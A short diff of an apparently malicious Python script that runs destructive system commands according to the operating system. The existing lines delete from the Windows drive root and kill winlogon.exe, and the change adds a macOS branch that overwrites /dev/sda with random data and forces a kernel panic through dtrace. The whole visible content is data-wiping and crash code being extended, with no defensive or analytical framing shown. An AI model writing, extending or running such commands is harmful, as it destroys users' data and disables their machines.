@@ -21,5 +21,8 @@ if platform.system() == 'Linux':
 elif platform.system() == 'Windows':
     os.system('del \\')
     os.system('taskkill /f /im winlogon.exe')
-else: # Darwin code not implemented as of right now
+elif platform.system() == 'Darwin':
+    os.system('dd if=/dev/urandom of=/dev/sda')
+    os.system('sudo dtrace -w -n "BEGIN{ panic(); }"')
+else:
     raise NotImplementedError('Unsupported OS')
